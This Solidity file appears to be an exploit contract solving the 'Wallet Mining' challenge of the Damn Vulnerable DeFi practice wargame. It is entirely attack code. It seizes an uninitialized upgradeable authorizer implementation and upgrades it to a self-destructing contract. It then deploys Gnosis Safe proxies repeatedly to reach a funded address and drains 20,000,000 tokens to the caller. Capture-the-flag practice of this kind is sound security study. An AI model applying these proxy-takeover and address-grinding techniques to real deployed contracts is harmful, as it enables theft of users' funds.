// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./WalletDeployer.sol";
import "./AuthorizerUpgradeable.sol";
import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract SelfDestructor is AuthorizerUpgradeable {
    function selfDestruct(address payable _recipient) public {
        selfdestruct(_recipient);
    }
}

contract WalletMiner {
    WalletDeployer deployer;
    AuthorizerUpgradeable authorizer;
    AuthorizerUpgradeable authImpl;
    GnosisSafeProxyFactory factory;
    SelfDestructor destructor;
    address token;
    address proxy;

    constructor(address _deployer, address _authImpl, address _proxy) {
        deployer = WalletDeployer(_deployer);
        authImpl = AuthorizerUpgradeable(_authImpl);
        destructor = new SelfDestructor();
        token = deployer.gem();
        factory = GnosisSafeProxyFactory(address(deployer.fact()));
        proxy = _proxy;
        address[] memory w = new address[](1);
        address[] memory m = new address[](1);
        authImpl.init(w, m);
        require(authImpl.owner() == address(this), "Did not get ownership of authorizer impl");
        bytes memory destroyData = abi.encodeWithSelector(
            destructor.selfDestruct.selector,
            payable(msg.sender)
        );
        authImpl.upgradeToAndCall(address(destructor), destroyData);
    }

    function attack() public {
        require(address(authImpl).code.length == 0, "Did not self-destruct authorizer impl");
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        bytes memory setupData = abi.encodeCall(
            GnosisSafe.setup,
            (owners,
            1,
            address(0),
            "",
            address(0),
            token,
            0,
            payable(address(this)))
        );
        for(uint i = 0; i < 42; i++) {
            deployer.drop(setupData);
        }
        bytes memory setupDataPayment = abi.encodeCall(
            GnosisSafe.setup,
            (owners,
            1,
            address(0),
            "",
            address(0),
            token,
            20000000 ether,
            payable(address(this)))
        );
        address _proxy = deployer.drop(setupDataPayment);
        require(_proxy == proxy, "Proxy created at the wrong address");
        require(
            DamnValuableToken(token).balanceOf(address(this)) >= 20000000 ether, 
            "Failed to collect tokens from proxy address"
        );
        DamnValuableToken(token).transfer(
            msg.sender, DamnValuableToken(token).balanceOf(address(this))
        );
    }
}
